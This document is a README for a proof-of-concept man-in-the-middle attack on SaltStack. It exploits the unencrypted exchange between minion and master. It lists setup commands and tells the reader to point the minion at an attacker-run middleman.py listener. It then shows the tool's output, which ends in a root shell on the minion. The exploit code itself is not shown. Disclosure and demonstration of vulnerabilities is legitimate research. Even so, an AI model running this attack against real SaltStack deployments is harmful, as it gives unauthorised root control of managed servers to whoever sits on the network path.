## Introduction

This is a proof of concept to demonstrate a MitM attack against Saltstack. It works
because we can tamper with the information sent between the client and the master as
it's sent in the clear.

## Prerequisites

These instructions are going to assume you already have a working salt-{master,minion}.
If you don't, you can set them up like this (on Ubuntu Precise):

```sh
sudo apt-get install python-software-properties
sudo add-apt-repository ppa:saltstack/salt
sudo apt-get update
sudo apt-get install salt-master salt-minion
sudo sed -i 's/#master: salt/master: 127.0.0.1/g' /etc/salt/minion
sudo restart salt-minion
sudo salt-key -A
```

Finally, you'll need to clone this repository somewhere.

```sh
git clone https://github.com/dzderic/salt-in-the-middle
```

## The attack

NB: I'm going to be running this attack against a master running on my local machine.
You'll probably want to insert the IP of your master instead of `127.0.0.1`.

This attack requires 2 things: a vulnerable minion and connectivity to the master the minion
is authenticated to. I'm going to assume you have both of these things.

If you're running all of this on one machine, you need to change the port `middleman.py`
listens on so it doesn't conflict with the real salt-master. By default, it runs on port
4507 (as opposed to the default 4506). You can point a minion to port 4506 like so:

```sh
sudo sed -i 's/#master_port: 4506/master_port: 4507/g' /etc/salt/minion
```

Once you've pointed the minion to the address `middleman.py` is listening on,
you're ready to run the exploit. You need to execute `middleman.py` in one window
and do a `sudo restart salt-minion` in another. Once you've done that, you should
get something like this:

```
$ ./middleman.py 
Initializing ZMQ
Authenticating with the minion
Waiting for an auth packet
Parsing the minion's public key
Getting the decryption of the token from the legitimate master
Generating an AES key
Sending the AES key to the minion
Authenticating with the minion to send pillar info
Waiting for an auth packet
Parsing the minion's public key
Getting the decryption of the token from the legitimate master
Generating an AES key
Sending the AES key to the minion
Getting pillar info from the minion
Waiting for a "minion_start" event
Minion ready to obey
#
```

Congratulations, you now have a root shell (or whatever user salt-minion is running as).

```
Minion ready to obey
# whoami
root
```
